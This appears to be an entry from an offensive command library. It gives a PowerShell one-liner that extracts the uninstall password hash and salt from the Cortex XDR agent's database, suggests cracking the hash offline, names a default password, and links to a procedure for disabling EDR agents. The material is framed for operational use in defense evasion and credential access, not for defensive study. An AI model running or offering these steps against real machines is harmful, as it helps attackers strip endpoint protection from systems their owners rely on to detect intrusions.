---
id: c3c71985-8238-4788-b69e-2db113690a21
name: cortex-xdr-locate-password-hash
type: command
executor: powershell
data: >-
  Get-Content "C:\ProgramData\Cyvera\LocalSystem\Persistence\agent_settings.db"
  | Select-String -Pattern "PasswordHash|PasswordSalt|password,salt"
output: null
created_at: '2023-04-06T03:56:27.632864+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - antivirus-removal
  - credential-access
verified: true
validated: true
---

# cortex-xdr-locate-password-hash

## Command

```powershell
Get-Content "C:\ProgramData\Cyvera\LocalSystem\Persistence\agent_settings.db" | Select-String -Pattern "PasswordHash|PasswordSalt|password,salt"
```

## Description

Locates and extracts the encrypted global uninstall password hash from the Cortex XDR agent's persistence database file, useful for bypassing uninstall protections.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| None | Uses default database path; adjust if custom install | No |

## Examples

### Basic Usage

```powershell
Get-Content "C:\ProgramData\Cyvera\LocalSystem\Persistence\agent_settings.db" | Select-String -Pattern "PasswordHash|PasswordSalt"
```

## Expected Output

```
PasswordHash: [hashed_value]
PasswordSalt: [salt_value]
```

Output shows the hash and salt strings; crack offline if needed. Default global password is 'Password1'.

## Related

- [[procedures/disable-elastic-agent-and-cortex-xdr-on-windows]]
